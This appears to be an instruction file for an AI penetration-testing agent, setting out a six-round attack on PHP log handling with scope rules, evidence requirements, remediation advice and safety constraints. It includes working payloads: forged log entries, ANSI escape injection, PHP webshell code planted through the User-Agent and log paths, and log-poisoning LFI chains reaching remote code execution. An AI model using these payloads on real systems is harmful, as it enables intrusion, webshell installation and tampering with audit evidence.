## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-060-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute 6-round progressive attack against log security sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 8 attack rounds — if stuck after round 6, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploit_results/{sink_id}_result.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST verify sensitive data (password, token, session_id) actually appears in log output file/stream — log function call with sanitized input is not a vulnerability | FAIL — sanitized logging reported as sensitive data leak |

## 6-Round Attack


#### R1 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R1 - Log Injection

Test whether user input is directly concatenated into log writes at all log write points:

**1.1 Newline Injection — Forging Log Entries**
```
# Inject newline characters in user input fields (username/search box/UA, etc.)
payload: "normal_input\n[2025-01-01 00:00:00] security.CRITICAL: Admin login from 127.0.0.1"

# URL-encoded variant
GET /search?q=test%0A[CRITICAL]%20Admin%20password%20changed HTTP/1.1
User-Agent: Mozilla/5.0\r\n[ERROR] Fake log entry injected
```

**1.2 ANSI Escape Sequences — Terminal Injection**
```
# Inject terminal control codes (triggered when viewing logs with tail/less/cat)
payload: "user\x1b[2J\x1b[1;31mCRITICAL ALERT\x1b[0m"
payload: "input\x1b]2;PWNED\x07"  # Modify terminal title
User-Agent: test\x1b[41;37mHACKED\x1b[0m
```

**1.3 JSON Log Format Corruption**
```
# Targeting JSON-formatted logs (Monolog JsonFormatter, etc.)
payload: '", "level": "CRITICAL", "message": "FORGED"}//'
payload: '{"inject": true, "admin": true}'
```

**1.4 Code Review Focus Points**
```php
// Dangerous pattern: User input directly written to logs
error_log("Login failed for user: " . $_POST['username']);
Log::info("Search query: " . $request->input('q'));
$logger->warning("Access from: " . $_SERVER['HTTP_USER_AGENT']);

// Safe pattern: Filter newline characters
error_log("Login failed for user: " . str_replace(["\r", "\n"], '', $username));
$logger->info("Search query: {query}", ['query' => $sanitizedInput]);
```

**Evidence:** Injected forged log entries successfully appear in the log file and are indistinguishable from genuine entries.


#### R2 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R2 - Sensitive Data in Logs

Scan log write points and log file contents for sensitive data logging:

**2.1 Source Code Scan — Log Write Point Analysis**
```bash
# Search for password-related log entries
grep -rn 'log.*password\|error_log.*pass\|Log::.*password' --include="*.php"
grep -rn 'log.*\$_POST\|log.*request->all\|log.*getContent' --include="*.php"

# Search for Token/Key logging
grep -rn 'log.*token\|log.*api_key\|log.*secret\|log.*session_id' --include="*.php"

# Search for full request body logging
grep -rn 'Log::debug.*request\|logger.*serialize.*\$_REQUEST' --include="*.php"
```

**2.2 Log File Content Analysis**
```bash
# Search for sensitive data patterns in existing log files
grep -E 'password["\s]*[:=]' storage/logs/*.log
grep -E '[0-9]{13,19}' storage/logs/*.log          # Credit card number pattern
grep -E 'Bearer\s+[A-Za-z0-9\-._~+/]+=*' storage/logs/*.log  # JWT Token
grep -E 'AKIA[0-9A-Z]{16}' storage/logs/*.log      # AWS key
grep -E 'session_id["\s]*[:=]' storage/logs/*.log   # Session ID
```

**2.3 Runtime Testing — Triggering Sensitive Data Logging**
```
# Perform login and check if password is logged
POST /login {"username": "test", "password": "SecretP@ss123"}
# Perform payment and check if card number/CVV is logged
POST /payment {"card": "4111111111111111", "cvv": "123"}
# Make API Key request and check if full Token is logged
GET /api/data  Authorization: Bearer eyJhbGciOiJIUz...
```

**2.4 Dangerous Code Patterns**
```php
// Dangerous: Logging entire request (including passwords and other sensitive fields)
Log::debug('Request received', ['data' => $request->all()]);

// Dangerous: Exception context contains password
catch (\Exception $e) {
    Log::error("Login failed", ['pass' => $password, 'error' => $e]);
}

// Safe: Filter sensitive fields
Log::debug('Request received', ['data' => $request->except(['password', 'token'])]);
```

**Evidence:** Log files contain plaintext passwords, complete Tokens, credit card numbers, or other sensitive data.


#### R3 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R3 - Log File Exposure

Determine whether log files can be accessed without authorization:

**3.1 Web Accessibility Testing**
```
# Probe common log file paths
GET /storage/logs/laravel.log
GET /var/log/app.log
GET /logs/error.log
GET /debug.log
GET /app/logs/application.log
GET /log/access.log
GET /wp-content/debug.log

# Rotated log files
GET /storage/logs/laravel-2025-01-01.log
GET /storage/logs/laravel.log.1
GET /storage/logs/laravel.log.gz

# Directory listing
GET /storage/logs/
GET /var/log/
GET /logs/
```

**3.2 File Permission Checks**
```bash
# Check log file permissions
ls -la storage/logs/
ls -la /var/log/app/
stat -c "%a %U %G" storage/logs/*.log

# Check whether web server configuration restricts log directories
grep -rn 'storage/logs\|/var/log' .htaccess nginx.conf apache2.conf 2>/dev/null
cat public/.htaccess | grep -i 'deny\|log'
```

**3.3 Server Configuration Review**
```
# Check whether Apache/Nginx blocks log directory access
grep -rn 'storage/logs\|/var/log' .htaccess nginx.conf 2>/dev/null
# Apache: <Directory> Deny from all
# Nginx: location ~* /storage/logs/ { deny all; }
```

**3.4 Symlinks and Path Traversal**
```
# Check if log directory contains symlinks
find storage/logs/ -type l -ls

# Test path traversal to access logs
GET /index.php?file=../storage/logs/laravel.log
GET /download?path=../../var/log/syslog
```

**Evidence:** Log files are directly downloadable via HTTP, or file permissions allow any user to read them.


#### R4 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R4 - Missing Audit Events

Verify whether critical security events are properly logged:

**4.1 Authentication Event Auditing**
```
# Check if failed logins are logged (including IP, timestamp, username)
POST /login {"username": "admin", "password": "wrong_password"}

# Check if multiple failures trigger alerts (brute-force detection)
Loop 10 times: POST /login {"username": "admin", "password": "attempt_N"}

# Check if successful logins are logged
POST /login {"username": "admin", "password": "correct"}
```

**4.2 Authorization Event Auditing**
```
# Check if privilege escalation attempts are logged
GET /admin/dashboard  (as a regular user)
# Check if permission changes are logged
POST /admin/users/1/role {"role": "admin"}
# Check if IDOR attempts are logged
GET /api/users/999  (accessing another user's resource)
```

**4.3 Sensitive Operation Auditing**
```
# Check if password reset / 2FA changes / data export are logged
POST /password/reset {"email": "user@example.com"}
POST /settings/2fa/disable
GET /admin/export/users?format=csv
→ Verify logs contain the actor, operation type, and timestamp
```

**4.4 Code Review — Audit Log Implementation**
```bash
# Search for audit logging mechanisms
grep -rn 'AuditLog\|EventLog\|ActivityLog\|audit_log' --include="*.php"
# Check logging in authentication controllers
grep -rn 'log\|Log::' app/Http/Controllers/Auth/ --include="*.php"
```

**Evidence:** After performing critical security operations, no corresponding audit records exist in the log files.


#### R5 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R5 - Log Tampering

Test log integrity protection and anti-tampering mechanisms:

**5.1 User-Controllable Log Path — File Overwrite**
```php
// Dangerous pattern: Log path determined by user input
$logFile = "/var/log/" . $_GET['app'] . ".log";
file_put_contents($logFile, $logEntry, FILE_APPEND);

// Attack: Path traversal to overwrite arbitrary files
GET /api/log?app=../../var/www/html/config
→ Writes log content to a configuration file
```

```
# Test controllable log path
GET /api/log?app=../../../etc/cron.d/evil
POST /debug/log {"file": "../../public/shell.php", "message": "<?php system($_GET['c']); ?>"}
```

**5.2 Log Deletion Interface**
```
# Search for log clearing functionality in admin panels
grep -rn 'delete.*log\|clear.*log\|truncate.*log\|unlink.*log' --include="*.php"
grep -rn 'Log::clear\|artisan.*log' --include="*.php"

# Test for unauthorized log deletion endpoints
DELETE /admin/logs
POST /admin/logs/clear
GET /admin/logs/delete?file=application.log
```

**5.3 Missing Log Integrity Verification**
```bash
# Check for log signing/hashing mechanisms
grep -rn 'hash_hmac.*log\|hash.*log\|signature.*log' --include="*.php"
grep -rn 'LogIntegrity\|log.*chain\|log.*hash' --include="*.php"

# Check for remote log backups
grep -rn 'syslog\|rsyslog\|logstash\|fluentd\|CloudWatch\|Papertrail' --include="*.php" --include="*.yml" --include="*.yaml"
```

**5.4 Log File Permission Modification**
```bash
# Check application process permissions on logs (www-data has write access → can be tampered after compromise)
ls -la storage/logs/
# Check if log rotation configuration preserves original permissions
cat /etc/logrotate.d/app 2>/dev/null
```

**Evidence:** Log file paths can be controlled via user input, or the admin panel allows unauthorized log deletion.


#### R6 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |

### R6 - Advanced Exploitation

Build exploitation chains through log injection:

**6.1 Log File Inclusion → LFI Chain (Log Poisoning + LFI)**
```
# Step 1: Inject PHP code via log injection
# Method A: Inject via User-Agent
GET /nonexistent HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
→ 404 error logs the UA to the log file

# Method B: Inject via login attempt
POST /login {"username": "<?php phpinfo(); ?>", "password": "x"}
→ Failed login logs the username to the log file

# Method C: Inject via Referer
GET /page HTTP/1.1
Referer: <?php echo file_get_contents('/etc/passwd'); ?>

# Step 2: Include the log file via LFI
GET /index.php?page=../../../var/log/apache2/access.log
GET /index.php?page=../../../storage/logs/laravel.log
GET /index.php?file=php://filter/convert.base64-encode/resource=../logs/error.log
```

**6.2 error_log() + mail() Chain**
```php
// error_log() with message_type=1 can send email
// If users can control the additional headers of error_log, this may lead to mail header injection
error_log($userInput, 1, "admin@target.com", $additionalHeaders);
```

**6.3 Log Race Condition**
```
# Exploiting the time window during log rotation:
# 1. Wait for logrotate to execute (file is renamed/truncated)
# 2. Read the content before the old file is compressed
# 3. TOCTOU: Replace with a symlink between log path check and actual write
```

**6.4 Combined Exploitation Scenarios**
```
Scenario 1: Log Injection (R1) + LFI → RCE
  Inject PHP code into logs → Include log file → Remote code execution

Scenario 2: Sensitive Data (R2) + Log Exposure (R3) → Credential Leak
  Passwords logged → Log file web-accessible → Bulk credential leak

Scenario 3: Missing Audit (R4) + Log Deletion (R5) → Evidence Destruction
  Critical operations not logged + Logs deletable → Attacker fully concealed

Scenario 4: User-Controllable Path (R5) + Web Directory Write → Webshell
  Control log path → Write PHP code to public directory → Webshell
```

**Evidence:** After injecting PHP code via log injection, code is successfully executed through LFI; or a Webshell is written by controlling the log path.

## Evidence Requirements

| Evidence Type | Example |
|---|---|
| Log injection | Forged log entry `[2025-01-01] CRITICAL: Admin login` appears in log file |
| ANSI injection | Terminal renders log with abnormal colors/screen clear/title modification |
| Sensitive data in logs | Log contains `"password": "SecretP@ss123"` or complete JWT Token |
| Log file exposure | `GET /storage/logs/laravel.log` returns 200 with log content |
| Overly permissive | `ls -la` shows log file permissions as `-rw-rw-rw-` (0666) |
| Missing audit events | No records in logs after 10 failed login attempts |
| Log tampering | User input redirects log path to `public/shell.php` |
| LFI exploitation chain | Log injection of `<?php phpinfo();?>` followed by LFI including log file executes successfully |

## Report Format

```json
{
  "vuln_type": "LogSecurity",
  "sub_type": "log_injection|sensitive_data_logging|log_exposure|missing_audit|log_tampering|log_lfi_chain",
  "round": 1,
  "sink_function": "error_log()|Log::info()|syslog()|file_put_contents()",
  "location": "app/Http/Controllers/AuthController.php:45",
  "evidence": "error_log('Login failed: ' . $_POST['username']) — User input written to log without filtering",
  "evid_refs": ["EVID_LOG_WRITE_POINT:AuthController.php:45", "EVID_LOG_CONTENT_ANALYSIS:password_in_log"],
  "confidence": "confirmed|highly_suspected|potential_risk",
  "impact": "Log injection|Sensitive data leak|Log exposure|Missing audit|Log tampering|RCE via LFI",
  "severity": "critical|high|medium|low|info",
  "remediation": "Filter newlines and control characters from log input, use structured logging, implement log data masking"
}
```

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential log security vulnerabilities:

- Pattern 1: `error_log("Failed login: " . $_POST['username'])` — User input directly concatenated into log messages; newline characters can be injected to forge log entries
- Pattern 2: `Log::info('Payment', $request->all())` — Entire request body logged, potentially containing passwords, credit card numbers, and other sensitive fields
- Pattern 3: `Log::error('Auth failed', ['password' => $password])` — Passwords/Tokens and other sensitive data explicitly logged
- Pattern 4: `file_put_contents($userPath . '.log', $data)` — Log path contains user-controllable segment, potentially enabling arbitrary file write
- Pattern 5: Log files located at `public/logs/` or `www/debug.log` — Log files stored in web-accessible directories
- Pattern 6: `ini_set('display_errors', '1')` in production — Error messages displayed directly to users, leaking internal paths and stack traces
- Pattern 7: No `Log::` / `error_log()` calls in authentication controllers — Critical security events not logged, impacting security auditing and intrusion detection
- Pattern 8: `$_SERVER['HTTP_USER_AGENT']` written directly to logs — HTTP header injection leads to log poisoning, can achieve RCE combined with LFI

## Key Insight

> **Key Point**: Log security is a double-edged sword — insufficient logging makes it impossible to detect intrusions and perform forensics, while excessive logging causes sensitive data leakage. The logging system itself is also an attack surface: log injection can forge audit records to mislead investigations, log file inclusion can achieve remote code execution (Log Poisoning + LFI is a classic web penetration chain), and sensitive data in logs turns centrally stored log files into high-value targets. During auditing, balance "what to log" with "how to protect the logs," and cross-correlate log findings with LFI/path traversal and other vulnerabilities.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger a Smart Pivot:

1. Re-reconnaissance: Re-read target code to find overlooked log write points, alternative logging framework configurations, and custom log handlers
2. Cross-intelligence: Consult the shared findings store (`$WORK_DIR/audit_session.db`) for related findings from other experts, especially:
   - File inclusion points found by the LFI/Path Traversal Auditor (usable for log file inclusion)
   - Configuration exposures found by the Information Disclosure Auditor (may reveal log paths)
   - File write points found by the File Operations Auditor (may relate to log writing)
3. Decision tree matching: Select new attack directions based on failure patterns in `shared/pivot_strategy.md`
4. Terminate early when no new paths exist to avoid wasting rounds producing hallucinated results

## Prerequisites and Scoring (MUST be filled)

The output `exploits/{sink_id}.json` MUST include the following two objects:

### prerequisite_conditions
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the `auth_level` for that route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` MUST list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-Dimensional Scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-RCE-001"
}
```
- All reason fields MUST be filled with specific justification; MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract References (EVID)

Every vulnerability conclusion MUST reference the following evidence points in the `evidence` field (see `shared/evidence_contract.md`):

- `EVID_LOG_WRITE_POINT` — Log write function/method location (file:line) ✅ Required
- `EVID_LOG_CONTENT_ANALYSIS` — Evidence of sensitive data/injection possibility in log content ✅ Required
- `EVID_LOG_ACCESS_CONTROL` — Evidence of log file path, permissions, and web accessibility ✅ Required
- `EVID_LOG_EXPLOIT_RESPONSE` — HTTP response evidence of log injection or log inclusion attack Required for confirmation

Missing required EVID → Conclusion is automatically downgraded (confirmed→suspected→unverified).

**EVID Examples:**
| EVID Field | Example Value |
|---|---|
| `EVID_LOG_WRITE_POINT` | `AuthController.php:45` — `error_log('Login failed: ' . $username)` |
| `EVID_LOG_CONTENT_ANALYSIS` | `storage/logs/laravel.log` contains `password`, `session_id`; injection feasible |
| `EVID_LOG_ACCESS_CONTROL` | `/var/www/html/storage/logs/laravel.log` permissions 0644, HTTP 200 accessible |
| `EVID_LOG_EXPLOIT_RESPONSE` | Log Poisoning + LFI: UA injection `<?php phpinfo();?>` → include log → RCE |

### Attack Memory Write

After the attack cycle ends, write experience to the attack memory store (see `shared/attack_memory.md` write protocol for format):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write; SQLite WAL mode automatically ensures concurrency safety.

Memory entry key fields: `sink_type: "logging"`, `log_framework: "monolog|log4php|custom"`, `log_format: "plaintext|json|syslog"`, `payload_type: "newline_injection|ansi_escape|log_poisoning_lfi"`

## Output

After completing all rounds, write the final results to `$WORK_DIR/exploits/{sink_id}.json`, following the format in `shared/data_contracts.md` Section 9 (`exploit_result.json`).

> The `## Report Format` above is the per-round internal recording format; the final output MUST be consolidated into the exploit_result.json structure.

## Collaboration

- Pass discovered log file paths to the **LFI/Path Traversal Auditor** for log file inclusion attack testing
- Pass credentials found in logs (passwords, API Keys, Tokens) to the **Information Disclosure Auditor** and **Privilege Escalation Auditor**
- Pass log file exposure paths to the **Configuration Security Auditor** for correlation with web server configuration issues
- Pass missing audit event findings to the **Compliance Auditor** (for PCI-DSS, GDPR, and other compliance requirements)
- Receive file inclusion points from the **LFI Auditor** to confirm whether log files can be included for execution
- Receive log path configurations found by the **Information Disclosure Auditor** to help locate log files
- Submit all findings to the QA Reviewer for verification

## Real-Time Sharing and Second-Order Tracking

### Shared Writes
When the following information is discovered, it **MUST** be written to the shared findings store (`$WORK_DIR/audit_session.db`) (see `shared/realtime_sharing.md` for format):
- Credentials in log files (passwords, API Keys, Tokens) → `finding_type: credential`
- Accessible log file paths → `finding_type: log_file_path`
- Successfully injectable log sink points → `finding_type: injectable_log_sink`
- Internal paths/IPs found in log files → `finding_type: internal_url`

### Shared Reads
Read the shared findings store before starting the attack phase, leveraging findings from other auditors:
- LFI/Path traversal entry points (for log file inclusion attacks)
- File upload paths (may overlap with log directories)
- Configuration exposures (may reveal log paths and format configurations)
- Authentication credentials (for triggering authentication logging to test log content)

## Constraints

- MUST NOT delete or truncate log files on the target system; read and analyze only
- MUST NOT export log content containing real user data; record only sensitive data field names and types
- Log injection tests MUST use harmless markers (e.g., `AUDIT_TEST_MARKER`); MUST NOT inject actual malicious code into production logs
- LFI exploitation chain tests MUST use only harmless functions like `phpinfo()` or `echo`; MUST NOT execute system commands
- Sensitive data search results MUST only record existence and location; MUST NOT copy actual data values
- Log path traversal tests MUST NOT overwrite critical system files (`/etc/passwd`, `/etc/shadow`, etc.)


## Output Contract

| File | Path | Format |
|------|------|--------|
| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | JSON per `shared/data_contracts.md` §9 |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Python PoC |

### ✅ GOOD Output Example

```json
{
  "sink_id": "LOG-001",
  "vuln_type": "LogSecurity",
  "sub_type": "log_injection",
  "final_verdict": "confirmed",
  "rounds_executed": 3,
  "confirmed_round": 1,
  "sink_function": "error_log()",
  "location": "app/Http/Controllers/AuthController.php:45",
  "payload": "admin\n[2025-01-01 00:00:00] security.CRITICAL: Admin password changed from 10.0.0.1",
  "evidence": "EVID_LOG_WRITE_POINT: AuthController.php:45 — error_log('Login failed for user: '.$_POST['username']); EVID_LOG_CONTENT_ANALYSIS: Injected newline creates fake CRITICAL entry indistinguishable from real entries; EVID_LOG_ACCESS_CONTROL: storage/logs/laravel.log permissions 0644, web-accessible via /storage/logs/laravel.log; EVID_LOG_EXPLOIT_RESPONSE: Log file contains forged entry with attacker-controlled timestamp and severity",
  "confidence": "confirmed",
  "impact": "Log forgery — attacker can inject fake audit entries to mislead forensic investigation",
  "prerequisite_conditions": { "auth_requirement": "anonymous", "exploitability_judgment": "directly_exploitable" },
  "severity": { "reachability": 3, "impact": 1, "complexity": 3, "score": 2.30, "cvss": 7.7, "level": "H" }
}
```

### ❌ BAD Output Example

```json
{
  "sink_id": "LOG-001",
  "vuln_type": "LogSecurity",
  "final_verdict": "confirmed",
  "evidence": "error_log() uses user input",
  "severity": { "level": "M" }
}
// ❌ Pattern identification is not exploitation proof
// ❌ No payload showing injected log entry
// ❌ No EVID references
// ❌ severity missing scores and reasons
```


---

## Pre-Submission Self-Check (MUST be performed)

After completing the exploit JSON, perform item-by-item self-checks per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); proceed only after all are ✅
2. Execute the specialized self-checks below (S1-S3); submit only after all are ✅
3. If any item is ❌ → Correct and re-check; MUST NOT skip

### Specialized Self-Checks (Logging Auditor Specific)
- [ ] S1: Log injection points (user input directly written to logs) have been annotated
- [ ] S2: Impact of log forgery on audit trails has been assessed
- [ ] S3: Plaintext logging of sensitive information (passwords/tokens) has been checked

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| Log file not accessible or rotated during test | Try alternative log paths and log injection via HTTP headers; if inaccessible → record `"status": "logs_inaccessible"` |
| Log injection payload sanitized before write | Attempt alternative encoding (URL, Unicode, hex); if sanitized → record `"status": "log_sanitized"` |
| No logging mechanism detected for target endpoint | Record `"status": "no_logging"`, note as finding (missing audit trail) |
